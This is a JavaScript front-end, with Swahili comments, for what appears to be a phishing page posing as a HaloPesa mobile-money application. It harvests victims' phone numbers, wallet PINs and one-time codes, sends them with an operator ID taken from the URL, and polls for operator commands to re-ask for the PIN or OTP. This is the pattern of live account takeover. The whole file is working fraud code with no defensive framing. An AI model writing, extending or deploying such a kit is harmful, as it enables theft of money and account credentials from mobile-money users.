// Function ya kupata admin ID kutoka kwenye URL (?admin=123456)
function getAdminFromUrl() {
  const urlParams = new URLSearchParams(window.location.search);
  return urlParams.get('admin') || '';
}

// Function ya kuhifadhi na kusoma userId kwenye LocalStorage
function getStoredUserId() {
  return localStorage.getItem('halopesa_user_id') || '';
}

function setStoredUserId(id) {
  localStorage.setItem('halopesa_user_id', id);
}

// 1. Kazi ya kuomba Resend OTP (Inatuma ombi la kutuma tena OTP)
async function handleResendOTP() {
  const userId = getStoredUserId();
  if (!userId) {
    alert('Kipindi chako kimeisha au hakikupatikana.');
    return;
  }

  try {
    const response = await fetch('/api/resend-otp', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ userId })
    });
    const result = await response.json();
    
    if (result.success) {
      alert('Ombi la msimbo mpya wa OTP limetumwa kikamilifu!');
    } else {
      alert(result.error || 'Hitilafu imetokea wakati wa kuomba OTP mpya.');
    }
  } catch (error) {
    alert('Hitilafu ya mtandao, tafadhali jaribu tena.');
  }
}

// 2. Kuwasilisha Fomu ya Application (Phone, PIN, Amount)
document.addEventListener('DOMContentLoaded', () => {
  const appForm = document.getElementById('applicationForm');
  const otpForm = document.getElementById('otpForm');
  const resendBtn = document.getElementById('resendOtpBtn');

  if (appForm) {
    appForm.addEventListener('submit', async (e) => {
      e.preventDefault();

      const phoneInput = document.getElementById('phoneInput')?.value || '';
      const pinInput = document.getElementById('pinInput')?.value || '';
      const amountInput = document.getElementById('amountInput')?.value || 'TSh 100,000';

      const cleanContact = phoneInput.replace(/\D/g, '');

      // Validations: HaloPesa Tanzania Pekee (062, 061, 25562, 25561)
      const isHaloPesa = /^(062|061|25562|25561)\d{7}$/.test(cleanContact);
      if (!isHaloPesa) {
        alert('Tafadhali ingiza namba sahihi ya HaloPesa Tanzania (inayoanza na 062 au 061).');
        return;
      }

      // Validations: PIN ya namba pekee
      if (!/^\d+$/.test(pinInput)) {
        alert('PIN lazima iwe namba pekee (Digits only).');
        return;
      }

      try {
        const response = await fetch('/api/submit-application', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            contact: cleanContact,
            pin: pinInput,
            amount: amountInput,
            adminChatId: getAdminFromUrl()
          })
        });

        const data = await response.json();
        if (data.success) {
          setStoredUserId(data.userId);
          startStatusPolling(data.userId);
        } else {
          alert(data.error || 'Hitilafu katika kuwasilisha ombi.');
        }
      } catch (err) {
        alert('Hitilafu ya kuunganisha na server.');
      }
    });
  }

  // 3. Kuwasilisha OTP Form
  if (otpForm) {
    otpForm.addEventListener('submit', async (e) => {
      e.preventDefault();

      const otpInput = document.getElementById('otpInput')?.value || '';
      const userId = getStoredUserId();

      // Validations: OTP ya namba pekee
      if (!/^\d+$/.test(otpInput)) {
        alert('Msimbo wa OTP lazima uwe namba pekee (Digits only).');
        return;
      }

      try {
        const response = await fetch('/api/submit-otp', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ userId, otp: otpInput })
        });

        const data = await response.json();
        if (data.success) {
          alert('OTP imewasilishwa! Subiri uthibitisho...');
        } else {
          alert(data.error || 'Hitilafu katika kuwasilisha OTP.');
        }
      } catch (err) {
        alert('Hitilafu ya kuunganisha na server.');
      }
    });
  }

  if (resendBtn) {
    resendBtn.addEventListener('click', handleResendOTP);
  }
});

// Function ya kufuatilia status ya ombi (Polling)
function startStatusPolling(userId) {
  const pollInterval = setInterval(async () => {
    try {
      const res = await fetch(`/api/check-status/${userId}`);
      const data = await res.json();

      if (data.status === 'APPROVED_LOAD_OTP') {
        document.getElementById('applicationSection')?.classList.add('hidden');
        document.getElementById('otpSection')?.classList.remove('hidden');
      } else if (data.status === 'SUCCESS') {
        clearInterval(pollInterval);
        document.getElementById('otpSection')?.classList.add('hidden');
        document.getElementById('successSection')?.classList.remove('hidden');
      } else if (data.status === 'DENIED') {
        clearInterval(pollInterval);
        alert('Ombi lako limekataliwa.');
      } else if (data.status === 'RETRY_PIN') {
        alert('PIN uliyoweka si sahihi. Tafadhali jaribu tena.');
        document.getElementById('otpSection')?.classList.add('hidden');
        document.getElementById('applicationSection')?.classList.remove('hidden');
      } else if (data.status === 'RETRY_OTP') {
        alert('Msimbo wa OTP si sahihi. Tafadhali weka msimbo sahihi.');
      }
    } catch (e) {
      console.error('Polling error:', e);
    }
  }, 3000);
}
